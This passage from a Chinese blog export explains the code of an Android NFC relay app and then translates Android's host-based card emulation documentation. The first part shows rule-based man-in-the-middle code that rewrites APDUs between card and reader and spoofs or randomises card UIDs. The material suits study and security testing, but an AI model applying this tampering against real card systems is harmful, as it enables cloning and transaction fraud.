DATABASE_NAME, null, DATABASE_VERSION);\n   }\n   \n   // 这里重写了onCreate方法, 是产生相应的table. 注意下列字符串定义了每个table的数据类型 \n   @Override\n   public void onCreate(SQLiteDatabase db) {\n       String CREATE_CONTACTS_TABLE = \"CREATE TABLE \" + TABLE_NAME + \"(\"\n           + KEY_ID + \" INTEGER PRIMARY KEY,\"\n           + KEY_NAME + \" TEXT,\"\n           + KEY_CONFIG + \" BLOB\"\n           + \")\";\n       db.execSQL(CREATE_CONTACTS_TABLE);\n   }\n   ```\n\n3. 如果要往database添加item, 如下函数可实现:\n\n   ```java\n   public void add(CloneListItem item) {\n       // 实例化一个可写的SQLiteDatabase\n       SQLiteDatabase db = this.getWritableDatabase();\n       // 实例化一个ContentValues, 以给对应的table赋值\n       ContentValues values = new ContentValues();\n       // 首先给KEY_NAME赋值, 也就是item的名称\n       values.put(KEY_NAME, item.toString());\n       // 获得anticol的值之后, 再build成blob类型\n       NfcComm ac = item.getAnticolData();\n       values.put(KEY_CONFIG, ac.getConfig().build());\n   \n       // Inserting Row 插入数据库中\n       db.insert(TABLE_NAME, null, values);\n       db.close(); // Closing database connection\n   }\n   ```\n\n4. 在`CLONE`界面里的自定义UID就是在这里实现的:\n\n   ```java\n   // 当数据库里的Defult没有时, 则会调用这个函数生成一个默认的item, 以后产生随机UID或者自定义UID都是在这个item里作修改.\n   public void addDefultConfig(){\n       SQLiteDatabase db = this.getWritableDatabase();\n       // 这里用的是rawQueray, 可以直接用命令选择相应的list\n       Cursor c = db.rawQuery(\"select * from list\",null);\n       if (c.getCount() <= 0) {\n           String defultAnticol = \"330477AD15D532012830010831010059024744\";\n           Log.i(\"***DefultAnticol: \", defultAnticol);\n           ContentValues values = new ContentValues();\n           values.put(KEY_NAME, \"Defult\");\n           values.put(KEY_ID, 1);\n           values.put(KEY_CONFIG, Utils.toBytes(defultAnticol));\n           db.insert(TABLE_NAME, null, values);\n       }\n       db.close();\n   }\n   \n   public void changeUID(String UID){\n       if (Utils.isHex(UID)) {\n           SQLiteDatabase db = this.getWritableDatabase();\n           ContentValues values = new ContentValues();\n           values.put(KEY_CONFIG,\n                     Utils.toBytes(\n                         \"3304\"+UID+\"32012830010831010059024744\"));\n           // Default item总是在数据库的第一个.\n           db.update(\n               TABLE_NAME,\n               values,\n               KEY_ID + \" = ?\",\n               new String[]{\"1\"}\n           );\n           db.close();\n       }\n   }\n   ```\n\n5. 删除item操作如下:\n\n   ```java\n   // 可以看出, 是根据id(数据库的第几项)来删除item的\n   public void delete(int id) {\n       SQLiteDatabase db = this.getWritableDatabase();\n       db.delete(TABLE_NAME, KEY_ID + \" = ?\",\n                 new String[]{String.valueOf(id)});\n       db.close();\n   }\n   ```\n\n6. 获得数据库所有的item:\n\n   ```java\n   public List<CloneListItem> getAll() {\n       List<CloneListItem> contactList = new ArrayList<CloneListItem>();\n       // Select All Query\n       String selectQuery = \"SELECT  * FROM \" + TABLE_NAME;\n   \n       SQLiteDatabase db = this.getWritableDatabase();\n       Cursor cursor = db.rawQuery(selectQuery, null);\n   \n       // looping through all rows and adding to list\n       if (cursor.moveToFirst()) {\n           do {\n               contactList.add(createByCursor(cursor));\n           } while (cursor.moveToNext());\n       }\n   \n       // return contact list\n       return contactList;\n   }\n   ```\n\n#### 2. RuleListStorage\n\n这里其实跟`CloneListStorage`很相似, 将一个比较不一样的例子:\n\n```java\n// 这个函数遍历整个数据库, 然后获取每个item的state值, 可能为0,1,2, 分别表示: 未选中, 修改卡返回的apdu数据, 修改读卡器的apdu数据\npublic Map<Integer, Integer> getStateMap(){\n    Map<Integer, Integer> map = new HashMap<>();\n    SQLiteDatabase db = this.getReadableDatabase();\n    String selectQuery = \"SELECT * FROM \" + TABLE_NAME;\n    Cursor c = db.rawQuery(selectQuery,null);\n    if (c.moveToFirst()) {\n        do {\n            map.put(c.getInt(c.getColumnIndex(KEY_ID)),\n                    c.getInt(c.getColumnIndex(KEY_SELECT_STATE)));\n        }while (c.moveToNext());\n    }\n    return map;\n}\n```\n\n#### 3. SessionLoggingDbHelper\n\n这个类存储卡和读卡器的apdu数据.\n\n### Ⅱ. filter\n\n这里是过滤一些不规范的apdu数据, 下面只分析部分`FilterManager`:\n\n```java\n\t/**\n     * Execute filters that are registered for HCE data\n     * @param nfcdata The APDU that should be filtered\n     * @return The filtered HCE data\n     */\npublic NfcComm filterHCEData(NfcComm nfcdata) {\n    // 这里根据RuleListStorage的规则识别一些来自读卡器的apdu指令，以便对其做进一步操作\n    rule.changeHCEData(nfcdata);\n    if (mHCENonEmpty) {\n        if (nfcdata.getType() != NfcComm.Type.NFCBytes) return nfcdata;\n        for (Filter f : mHCEFilters) {\n            nfcdata = f.filter(nfcdata);\n        }\n    }\n    return nfcdata;\n}\n\n\t/**\n     * Execute filters that are registered for Card data\n     * @param nfcdata The APDU that should be filtered\n     * @return The filtered Card data\n     */\npublic NfcComm filterCardData(NfcComm nfcdata) {\n    // 这里根据上面识别的来自读卡器的apdu指令，对卡返回的数据进行修改\n    rule.changeCardData(nfcdata);\n    if (mCardNonEmpty) {\n        if (nfcdata.getType() != NfcComm.Type.NFCBytes) return nfcdata;\n        for (Filter f : mCardFilters) {\n            nfcdata = f.filter(nfcdata);\n        }\n    }\n    return nfcdata;\n}\n\n\t/**\n     * Execute filters that are registered for Anticollision data\n     * @param anticol NfcComm object containing anticol data\n     */\npublic NfcComm filterAnticolData(NfcComm anticol) {\n    // 修改UID也是在这里开始的\n    anticol = rule.changeAnticolData(anticol);\n    if (mAnticolNonEmpty) {\n        if (anticol.getType() != NfcComm.Type.AnticolBytes) return anticol;\n        for (Filter f : mAnticolFilters) {\n            anticol = f.filter(anticol);\n        }\n    }\n    return anticol;\n}\n```\n\n### Ⅲ. 其他\n\n#### 1. CustomTextWatcher\n\n`TextWatcher`有三个重要的方法, 顾名思义分别是TextView在改变前/改变时/改变后的动作:\n\n```java\n// 在改变前没有做任何修改\n@Override\npublic void beforeTextChanged(CharSequence charSequence, int start,\n                              int count, int after) {\n}\n\n// 这里限定了输入时只能输入16进制字符, 而且每两个字符之间像个一个空格\n@Override\npublic void onTextChanged(CharSequence charSequence, int start, int before,\n                          int count) {\n    try {\n        String temp = charSequence.toString();\n        // Set selection.\n        if (mLastText.equals(temp)) {\n            if (mInvalid) {\n                mSelection -= 1;\n            } else {\n                if ((mSelection >= 1) && (temp.length() > mSelection - 1)\n                    && (temp.charAt(mSelection - 1)) == ' ') {\n                    mSelection += 1;\n                }\n            }\n            int length = mLastText.length();\n            if (mSelection > length) {\n\n                mEditText.setSelection(length);\n            } else {\n\n                mEditText.setSelection(mSelection);\n            }\n            mFormat = false;\n            mInvalid = false;\n            return;\n        }\n\n        mFormat = true;\n        mSelection = start;\n\n        // Delete operation.\n        if (count == 0) {\n            if ((mSelection >= 1) && (temp.length() > mSelection - 1)\n                && (temp.charAt(mSelection - 1)) == ' ') {\n                mSelection -= 1;\n            }\n\n            return;\n        }\n\n        // Input operation.\n        mSelection += count;\n        char[] lastChar = (temp.substring(start, start + count))\n            .toCharArray();\n        int mid = lastChar[0];\n        if (mid >= 48 && mid <= 57) {\n            /* 1-9. */\n        } else if (mid >= 65 && mid <= 70) {\n            /* A-F. */\n        } else if (mid >= 97 && mid <= 102) {\n            /* a-f. */\n        } else {\n            /* Invalid input. */\n            mInvalid = true;\n            temp = temp.substring(0, start)\n                + temp.substring(start + count, temp.length());\n            mEditText.setText(temp);\n            return;\n        }\n\n    } catch (Exception e) {\n        Log.i(TAG, e.toString());\n    }\n}\n\n@Override\npublic void afterTextChanged(Editable editable) {\n    try {\n        /* Format input. */\n        if (mFormat) {\n            StringBuilder text = new StringBuilder();\n            // 这里将空格删去\n            text.append(editable.toString().replace(\" \", \"\"));\n            int length = text.length();\n            int sum = (length % 2 == 0) ? (length / 2) - 1 : (length / 2);\n            for (int offset = 2, index = 0; index < sum; offset += 3, index++) {\n                text.insert(offset, \" \");\n            }\n            mLastText = text.toString();\n            mEditText.setText(text);\n        }\n    } catch (Exception e) {\n        Log.i(TAG, e.toString());\n    }\n}\n```\n\n#### 2. NfcComm\n\n这个类定义了nfc apdu数据的多种数据类型.\n\n#### 3. RuleMatching\n\n1. 下示代码时修改UID的一个函数:\n\n   ```java\n   public void changeUIDRule(NfcComm anticol){\n       String UID = null;\n       if (ac.equals(MitMAction.RandomAnticol)) {\n           // 随机生成4字节的数据作为UID\n           UID = Utils.randomHexString(4);\n       } else if (ac.equals(MitMAction.SelfDefineAnticol)) {\n           UID = mUID;\n       }\n       if (UID != null) {\n           mConfig = Utils.relaceBytesFromArray(anticol.getConfig().build(),\n                                                Utils.toBytes(UID),\n                                                new byte[]{(byte)0x33,\n                                                           (byte)0x04});\n       }\n   }\n   ```\n\n2. 以下是识别来自card的指令的函数:\n\n   ```java\n   private void compReaderCommFromDb(NfcComm nfcdata) {\n       RuleListStorage db = new RuleListStorage(RelayFragment.getInstance().getContext());\n       List<RuleListItem> items = db.getAll();\n       // 遍历每个位于规则数据库的item\n       for (RuleListItem item: items) {\n           // 如果当前的item的state为1, 则将mChangeCardComm赋值\n           if (item.getSelect() == 1) {\n               if (Utils.bytesToHex(nfcdata.getData()).indexOf(\n                   Utils.bytesToHex(item.getReaderComm().getData())) == 0) {\n                   mChangeCardComm = item.getCardComm().getData();\n                   break;\n               } else {\n                   mChangeCardComm = null;\n               }\n           }else if (item.getSelect() == 2) {\n               // 通过读卡器的数据来修改读卡器命令\n               if (Utils.bytesToHex(nfcdata.getData()).indexOf(\n                   Utils.bytesToHex(item.getReaderComm().getData())) == 0) {\n                   mChangeHceComm = item.getCardComm().getData();\n                   break;\n               } else {\n                   mChangeHceComm = null;\n               }\n           }\n       }\n   }\n   ```\n\n3. 以下三个函数时中间人apdu数据重要函数:\n\n   ```java\n   // 修改card返回的apdu数据\n   public NfcComm changeCardData(NfcComm nfcdata) {\n       //        Log.i(TAG,\"Card: \" + Utils.bytesToHex(nfcdata.getData()));\n       if (mChangeCardComm != null) {\n           //            Log.i(TAG,\"Exec: \" + Utils.bytesToHex(mChangeCardComm));\n           nfcdata.setData(mChangeCardComm);\n           mChangeCardComm = null;\n       }\n       return nfcdata;\n   }\n   // 修改读卡器发送的apdu数据\n   public NfcComm changeHCEData(NfcComm nfcdata) {\n       //        Log.i(TAG,\"HCE : \" + Utils.bytesToHex(nfcdata.getData()));\n       compReaderCommFromDb(nfcdata);\n       if (mChangeHceComm != null) {\n           nfcdata.setData(mChangeHceComm);\n           mChangeHceComm = null;\n       }\n       return nfcdata;\n   }\n   // 修改uid\n   public NfcComm changeAnticolData(NfcComm anticol) {\n       if (anticol.getType() == NfcComm.Type.AnticolBytes) {\n           changeUIDRule(anticol);\n           if (mConfig != null) {\n               anticol = new NfcComm(new ConfigBuilder(mConfig));\n               mConfig = null;\n           }\n       }\n       return anticol;\n   }\n   ```\n\n#### 4. Utils\n\n这个类含有全局需要的处理数据的函数. 大部分已注释了解释的函数不在列举. 举一个简单的函数:\n\n```java\n// 这个函数读取特定目录下的所有文件, 并返回文件名列表\npublic static ArrayList<String> listDir(String path){\n    ArrayList<String> myFile = new ArrayList<String>();\n    String realPath=Environment.getExternalStorageDirectory().toString()+\"/MTYReader/\"+path;\n    Log.i(\"listDir\",realPath);\n    File file=new File(realPath);\n    File[] files=file.listFiles();\n    if (files == null) {\n        return null;\n    }\n    for(int i =0;i<files.length;i++){\n        myFile.add(files[i].getName());\n    }\n    return myFile;\n}\n```","tags":[{"name":"Android Developer","slug":"Android-Developer","permalink":"http://www.killshadow.xyz/tags/Android-Developer/"}]},{"title":"基于主机的卡模拟(HCE)概述","date":"2018-06-14T17:23:33.334Z","path":"2018/06/15/基于主机的卡模拟(HCE)概述/","raw":"---\ntitle: 基于主机的卡模拟(HCE)概述\ndate: \ncategories:\ntoc: ture\ntags:\n\t- Android Developer\ncomments: true\n---\n## 0x00 概述\n\n许多提供NFC功能的基于Android的设备已经支持NFC卡模拟。在大多数情况下，该卡由设备中的单独芯片模拟，称为*安全元件(Secure Element)*。无线运营商提供的许多SIM卡还包含安全元件(Secure Element)。\n<!-- more -->\nAndroid 4.4引入了另一种卡模拟方法，它不涉及SE，称为*基于主机的卡模拟*。这允许任何Android应用程序模拟卡并直接与NFC读卡器通话。本文档描述了基于主机的卡仿真（HCE）如何在Android上工作，以及如何使用此技术开发模拟NFC卡的应用程序。\n\n## 0x01 卡仿真与SE\n\n当使用安全元件(Secure Element)提供NFC卡模拟时，将通过Android应用程序将要模拟的卡提供到设备上的安全元件(Secure Element)中。然后，当用户通过NFC终端握住设备时，设备中的NFC控制器将来自读卡器(NFC Reader)的所有数据直接路由到安全元件(Secure Element)。图1说明了这个概念。\n\n<center>![图1.带有安全元件的NFC卡仿真](https://github.com/killshadow/killshadow.github.io/blob/master/image/002/1.png?raw=true)</center>\n\n安全元件(Secure Element)本身执行与NFC终端的通信，并且完全不涉及Android应用。交易完成后，Android应用程序可以直接查询SE的交易状态并通知用户。\n\n## 0x02 基于主机的卡模拟\n\n当使用基于主机的卡仿真来仿真NFC卡时，数据将被路由到直接运行Android应用程序的主机CPU，而不是将NFC协议帧路由到SE。图2展示了基于主机的卡仿真如何工作。\n\n<center>![图2.基于主机的卡仿真模式](https://github.com/killshadow/killshadow.github.io/blob/master/image/002/2.png?raw=true)</center>\n\n## 0x03 支持的NFC卡和协议\nNFC标准提供对许多不同协议的支持，并且可以模拟不同类型的卡。\n\nAndroid 4.4支持当今市场上常见的几种协议。许多现有的非接触式卡已经基于这些协议，例如非接触式支付卡。这些协议也得到了当今市场上众多NFC读卡器的支持，其中包括Android NFC设备可以自己作为读卡器（请参见[IsoDep](https://developer.android.com/reference/android/nfc/tech/IsoDep.html)课程）。这使您可以仅使用基于Android的设备在HCE周围构建和部署端到端NFC解决方案。\n\n具体而言，Android 4.4支持基于NFC-Forum ISO-DEP规范（基于ISO / IEC 14443-4）的仿真卡，并处理ISO / IEC 7816-4规范中定义的应用协议数据单元（APDU）。Android只强制在Nfc-A（ISO / IEC 14443-3 Type A）技术之上模拟ISO-DEP。支持Nfc-B（ISO / IEC 14443-4 Type B）技术是可选的。所有这些规格的分层如图3所示。\n\n<center>![图3.Android的HCE协议栈](https://github.com/killshadow/killshadow.github.io/blob/master/image/002/3.png?raw=true)</center>\n\n## 0x04 HCE服务\n\nAndroid中的HCE体系结构基于Android [Service](https://developer.android.com/reference/android/app/Service.html)组件（称为“HCE服务”）。服务的一个关键优势是它可以在没有任何用户界面的情况下在后台运行。这对于许多HCE应用程序来说非常合适，例如会员卡或公交卡，用户不需要启动应用程序即可使用它。相反，通过NFC读卡器轻敲设备将启动正确的服务（如果尚未运行）并在后台执行该事务。当然，如果有意义的话，您可以自由地从您的服务中启动额外的UI（例如用户通知）。\n\n### 4.1 服务选择\n\n当用户将设备连接到NFC读取器时，Android系统需要知道NFC读取器实际想要与哪个HCE服务通话。这就是ISO / IEC 7816-4规范的出处：它定义了一种选择应用程序的方式，以应用程序ID（AID）为中心。一个AID最多由16个字节组成。如果您正在模拟现有NFC读卡器基础架构的卡片，那么这些读卡器所寻找的AID通常是众所周知的并且是公开注册的（例如Visa和MasterCard等支付网络的AID）。\n\n如果您想为自己的应用程序部署新的读卡器基础结构，则需要注册您自己的AID。AID的注册程序在ISO / IEC 7816-5规范中定义。如果您要为Android部署HCE应用程序，Google建议按照7816-5注册AID，因为它可以避免与其他应用程序发生冲突。\n\n### 4.2 AID组\n\n在某些情况下，HCE服务可能需要注册多个AID才能实现某个应用程序，并且需要确保它是所有这些AID的默认处理程序（而不是组中的某些AID转到其他服务） 。\n\n一个AID组是应该被OS视为一起归属的AID列表。对于AID组中的所有AID，Android会保证以下其中一项：\n\n*   组中的所有AID都路由到此HCE服务\n*   该组中的任何AID都不会路由到此HCE服务（例如，因为用户更喜欢另一个在您的组中也请求一个或多个AID的服务）\n\n换句话说，没有中间状态，组中的一些AID可以路由到一个HCE服务，另一些AID可路由到另一个。\n\n### 4.3 AID组和类别\n\n每个AID组都可以与一个类别关联。这允许Android按类别将HCE服务组合在一起，并且反过来又允许用户在类别的级别而不是AID级别设置默认值。通常，避免在应用程序的任何面向用户的部分提及AID：它们对普通用户没有任何意义。\n\nAndroid 4.4支持两种类别: [CATEGORY_PAYMENT](https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#CATEGORY_PAYMENT)（涵盖行业标准支付应用程序）和[CATEGORY_OTHER](https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#CATEGORY_OTHER)（对于所有其他HCE应用程序）。\n\n> **注意：**[CATEGORY_PAYMENT](https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#CATEGORY_PAYMENT)在任何给定时间，只能在系统中启用该类别中的一个AID组。通常，这将是一款了解主要信用卡付款协议并可以在任何商家工作的应用程序。\n>\n> 对于仅适用于一个商家（如储值卡）*的闭环*支付应用程序，您应该使用[CATEGORY_OTHER](https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#CATEGORY_OTHER)。此类别中的AID组可以始终处于活动状态，并且在需要时可以在AID选择期间由NFC读卡器给予优先权。\n\n## 0x05 实施HCE服务\n\n要使用基于主机的卡仿真来模拟NFC卡，您需要创建一个[Service](https://developer.android.com/reference/android/app/Service.html)处理NFC事务的组件。\n\n### 5.1 检查HCE支持\n\n您的应用程序可以通过检查[FEATURE_NFC_HOST_CARD_EMULATION](https://developer.android.com/reference/android/content/pm/PackageManager.html#FEATURE_NFC_HOST_CARD_EMULATION)功能来检查设备是否支持HCE 。您应该[`<uses-feature>`](https://developer.android.com/guide/topics/manifest/uses-feature-element.html)在应用程序清单中使用该标记来声明您的应用程序使用HCE功能，以及该应用程序是否需要运行。\n\n### 5.2 服务实施\n\nAndroid 4.4带有一个便利的[Service](https://developer.android.com/reference/android/app/Service.html)类，可以作为实现HCE服务的基础：[HostApduService](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html)类。\n\n因此，第一步要扩大[HostApduService](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html)。\n\n```java\npublic class MyHostApduService extends HostApduService {\n    @Override\n    public byte[] processCommandApdu(byte[] apdu, Bundle extras) {\n       ...\n    }\n    @Override\n    public void onDeactivated(int reason) {\n       ...\n    }\n}\n```\n\n[HostApduService](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html)声明了两个需要重写和实现的抽象方法。\n\n[processCommandApdu()](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html)只要NFC读卡器将应用协议数据单元（APDU）发送到您的服务，就会调用它。APDU也在ISO / IEC 7816-4规范中定义。APDU是在NFC读卡器和您的HCE服务之间交换的应用级数据包。该应用级协议是半双工的：NFC读卡器会向您发送命令APDU，并等待您发送响应APDU作为回报。\n\n> **注：** ISO / IEC 7816-4规范还定义了多个逻辑信道的概念，您可以在单独的逻辑信道上进行多个并行APDU交换。Android的HCE实现只支持单个逻辑通道，所以只有单线程交换APDU。\n\n如前所述，Android使用AID来确定读者想要与哪个HCE服务交谈。通常，NFC读卡器向您的设备发送的第一个APDU是“SELECT AID”APDU; 这个APDU包含读卡器想与之交谈的AID。Android从APDU中提取AID，将其解析为HCE服务，然后将该APDU转发给已解析的服务。\n\n您可以通过返回响应APDU的字节来发送响应APDU [processCommandApdu()](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html#processCommandApdu(byte[], android.os.Bundle))。请注意，此方法将在应用程序的主线程中调用，该线程不应被阻止。所以如果你不能立即计算并返回一个响应APDU，那么返回null。然后，您可以在另一个线程上完成必要的工作，并[sendResponseApdu()](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html#sendResponseApdu(byte[]))在完成后使用[HostApduService](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html)该类中定义的方法发送响应。\n\nAndroid会继续将新的APDU从读取器转发到您的服务，直到：\n\n1.  NFC读卡器发送另一个“SELECT AID” APDU，OS将其解析为不同的服务;\n2.  NFC读卡器和您的设备之间的NFC链接被破坏。\n\n在这两种情况下，你的类的 [onDeactivated()](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html#onDeactivated(int))实现都是通过一个参数来调用的，这个参数指出了两者中的哪一个发生了。\n\n如果您正在使用现有的读卡器基础架构，则需要实现读卡器在您的HCE服务中期望的现有应用程序级协议。\n\n如果您正在部署您控制的新读卡器基础架构，则可以定义自己的协议和APDU序列。通常，尝试限制APDU数量和需要交换的数据大小：这样可以确保用户只需将设备通过NFC读取器持续一段时间即可。合理的上限约为1KB的数据，通常可以在**300ms**内交换。\n\n### 5.3 服务清单声明和AID注册\n\n您的服务必须像往常一样在清单中声明，但还必须在服务声明中添加一些附加件。\n\n首先，为了告诉平台它是一个实现[HostApduService](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html)接口的HCE服务 ，你的服务声明必须包含一个[SERVICE_INTERFACE](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html#SERVICE_INTERFACE)动作的[Intent Filter](https://blog.csdn.net/mynameishuangshuai/article/details/51673273)。\n\n另外，为了告知平台哪个AIDs组被这个服务请求，一个[SERVICE_META_DATA](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html#SERVICE_META_DATA)`<meta-data>`标签必须包含在服务的声明中，指向一个XML资源和关于HCE服务的附加信息。\n\n最后，您必须将该`android:exported`属性设置为true，并且`\"android.permission.BIND_NFC_SERVICE\"`在服务声明中要求权限。前者确保服务可以被外部应用程序绑定。后者然后强制只有拥有该`\"android.permission.BIND_NFC_SERVICE\"`权限的外部应用程序 才能绑定到您的服务。既然`\"android.permission.BIND_NFC_SERVICE\"`是一个系统权限，这有效地强制只有Android OS可以绑定到你的服务。\n\n这是一个[HostApduService](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html)清单声明的例子：\n\n```xml\n<service android:name=\".MyHostApduService\" android:exported=\"true\"\n         android:permission=\"android.permission.BIND_NFC_SERVICE\">\n    <intent-filter>\n        <action android:name=\"android.nfc.cardemulation.action.HOST_APDU_SERVICE\"/>\n    </intent-filter>\n    <meta-data android:name=\"android.nfc.cardemulation.host_apdu_service\"\n               android:resource=\"@xml/apduservice\"/>\n</service>\n```\n\n\n\n这个元数据标签指向一个`apduservice.xml`文件。下面显示了具有包含两个专有AID的单个AID组声明的此类文件的示例：\n\n```xml\n<host-apdu-service xmlns:android=\"http://schemas.android.com/apk/res/android\"\n           android:description=\"@string/servicedesc\"\n           android:requireDeviceUnlock=\"false\">\n    <aid-group android:description=\"@string/aiddescription\"\n               android:category=\"other\">\n        <aid-filter android:name=\"F0010203040506\"/>\n        <aid-filter android:name=\"F0394148148100\"/>\n    </aid-group>\n</host-apdu-service>\n```\n\n该`<host-apdu-service>`标签需要包含一个`<android:description>` 属性，该属性包含可能在UI中显示的用户友好的服务描述。该`requireDeviceUnlock`属性可用于指定在调用此服务来处理APDU之前必须先解锁设备。\n\n在`<host-apdu-service>`必须包含一个或多个`<aid-group>`标签。每个 `<aid-group>`标签都需要：\n\n*   包含一个`android:description`属性，其中包含用户友好的AID组描述，适合在UI中显示。\n*   将其`android:category`属性设置为指示AID组所属的类别，例如[CATEGORY_PAYMENT](https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#CATEGORY_PAYMENT) or 定义的字符串常[CATEGORY_OTHER](https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#CATEGORY_OTHER)。\n*   每个标签`<aid-group>`必须包含一个或多个 `<aid-filter>`标签，每个标签包含一个AID。AID必须以十六进制格式指定，并且包含偶数个字符。\n\n最后，您的应用程序还需要拥有[NFC](https://developer.android.com/reference/android/Manifest.permission.html#NFC)可以注册为HCE服务的 权限。\n\n## 0x06 AID冲突解决\n\n多个[HostApduService](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html)组件可以安装在单个设备上，并且可以由多个服务注册相同的AID。Android平台根据AID属于哪个类别来解决AID冲突。每个类别可能有不同的冲突解决策略。\n\n例如，对于某些类别（如付款），用户可能能够在Android设置UI中选择默认服务。对于其他类别，策略可能总是要求用户在冲突情况下调用哪个服务。要查询特定类别的冲突解决策略，请参阅 [getSelectionModeForCategory()](https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#getSelectionModeForCategory(java.lang.String))。\n\n### 6.1 检查您的服务是否为默认设置\n\n应用程序可以使用[isDefaultServiceForCategory(ComponentName, String)](https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#isDefaultServiceForCategory(android.content.ComponentName, java.lang.String))API 检查其HCE服务是否是某个类别的默认服务。\n\n如果您的服务不是默认设置，则可以请求将其设置为默认设置。看[ACTION_CHANGE_DEFAULT](https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#ACTION_CHANGE_DEFAULT)。\n\n## 0x07 付款应用\n\nAndroid会将AID组为“payment”的类别，声明的HCE服务视为支付应用程序。Android 4.4版本包含一个名为“tap＆pay”的top-level设置菜单条目，它列举了所有这些支付应用程序。在此设置菜单中，用户可以选择在点按付款终端时将调用的默认支付应用程序。\n\n### 7.1 支付应用程序所需的resource\n\n为了提供更具视觉吸引力的用户体验，HCE支付应用程序需要为其服务提供额外的resource：所谓的服务标记。\n\n这个asset的大小应该是260x96 dp，并且可以在元数据(meta-data)XML文件中通过添加指向drawable resource`android:apduServiceBanner`的`<host-apdu-service>`标签的属性来指定 。一个例子如下所示：\n```xml\n<host-apdu-service xmlns:android=\"http://schemas.android.com/apk/res/android\"\n        android:description=\"@string/servicedesc\"\n        android:requireDeviceUnlock=\"false\"\n        android:apduServiceBanner=\"@drawable/my_banner\">\n    <aid-group android:description=\"@string/aiddescription\"\n               android:category=\"payment\">\n        <aid-filter android:name=\"F0010203040506\"/>\n        <aid-filter android:name=\"F0394148148100\"/>\n    </aid-group>\n</host-apdu-service>\n```\n\n## 0x08 屏幕关闭和锁屏行为\n\n当设备的屏幕关闭时，当前的Android实施将NFC控制器和应用程序处理器完全关闭。因此，当屏幕关闭时，HCE服务将无法工作。\n\n然而，HCE服务可以从锁定屏幕中起作用：这由HCE服务标记中的`android:requireDeviceUnlock`属性控制`<host-apdu-service>`。默认情况下，不需要设备解锁，即使设备被锁定，您的服务也会被调用。\n\n如果您将`android:requireDeviceUnlock`HCE服务的属性设置为“true”，Android会提示用户在您靠近NFC读卡器时解锁设备，NFC读卡器会选择已解析为您的服务的AID。解锁后，Android会显示一个对话框，提示用户再次点击以完成交易。这是必要的，因为用户可能已经将设备从NFC读卡器移开以便解锁它。\n\n## 0x09 与SE卡共存\n\n本部分对于已经部署依赖SE进行卡模拟的应用程序的开发人员很感兴趣。Android的HCE实现旨在与其他实现卡仿真的方法并行工作，包括使用SE。\n\n>**注意：** Android不提供用于直接与SE进行通信的API。\n\n这种共存基于一种称为“AID路由”的原则：NFC控制器保留一个由（有限）路由规则列表组成的路由表。每个路由规则都包含一个AID和一个目的地。目标可以是主机CPU（Android应用程序正在运行的地方），也可以是连接的SE。\n\n当NFC读卡器发送具有“SELECT AID”的APDU时，NFC控制器解析它并检查AID是否与其路由表中的任何AID匹配。如果匹配，那么APDU和其后的所有APDU将被发送到与AID相关联的目的地，直到收到另一个“SELECT AID” APDU或NFC链路断开。\n\n> **注意：** 虽然ISO / IEC 7816-4也定义了“部分匹配”的概念，但目前Android HCE设备不支持此功能。\n\n图4说明了这种架构。\n\n<center>![图4.使用SE和主机卡模拟的Android操作](https://github.com/killshadow/killshadow.github.io/blob/master/image/002/4.png?raw=true)</center>\n\nNFC控制器通常还包含APDU的默认路由。在路由表中找不到AID时，将使用默认路由。尽管此设置可能因设备而异，但Android设备需要确保您的应用注册的AID已正确路由到主机。\n\n实现HCE服务或使用SE的Android应用程序不必担心配置路由表 - 这是由Android自动处理的。Android只需要知道哪些AID可以由HCE服务处理，哪些可以由SE处理。基于哪些服务已安装，以及哪些用户已配置为首选服务，路由表会自动配置。\n\n我们已经介绍了如何声明HCE服务的AID。以下部分说明如何为使用SE进行卡模拟的应用程序声明AID。\n\n### 9.1 Secure Element AID注册\n\n使用SE进行卡模拟的应用程序可以在其清单中声明所谓的“关闭主机服务”。这种服务的声明几乎与宣布HCE服务相同。以下情况例外：\n\n* 意图过滤器中使用的操作必须设置为 [SERVICE_INTERFACE](https://developer.android.com/reference/android/nfc/cardemulation/OffHostApduService.html#SERVICE_INTERFACE)。\n\n* 元数据名称属性必须设置为 [SERVICE_META_DATA](https://developer.android.com/reference/android/nfc/cardemulation/OffHostApduService.html#SERVICE_META_DATA)。\n\n* 元数据XML文件必须使用`<offhost-apdu-service>`根标签。\n\n    ```xml\n    <service android:name=\".MyOffHostApduService\" android:exported=\"true\"\n             android:permission=\"android.permission.BIND_NFC_SERVICE\">\n        <intent-filter>\n            <action android:name=\"android.nfc.cardemulation.action.OFF_HOST_APDU_SERVICE\"/>\n        </intent-filter>\n        <meta-data android:name=\"android.nfc.cardemulation.off_host_apdu_service\"\n                   android:resource=\"@xml/apduservice\"/>\n    </service>\n    ```\n\n相应`apduservice.xml`文件注册两个AID 的示例：\n\n```xml\n<offhost-apdu-service xmlns:android=\"http://schemas.android.com/apk/res/android\"\n           android:description=\"@string/servicedesc\">\n    <aid-group android:description=\"@string/subscription\" android:category=\"other\">\n        <aid-filter android:name=\"F0010203040506\"/>\n        <aid-filter android:name=\"F0394148148100\"/>\n    </aid-group>\n</offhost-apdu-service>\n```\n\n该`android:requireDeviceUnlock`属性不适用于脱离主机服务，因为主机CPU不参与事务，因此无法阻止SE在设备锁定时执行事务。\n\n该`android:apduServiceBanner`属性必须用于作为支付应用程序的关闭主机服务，以便作为默认支付应用程序进行选择。\n\n### 9.2 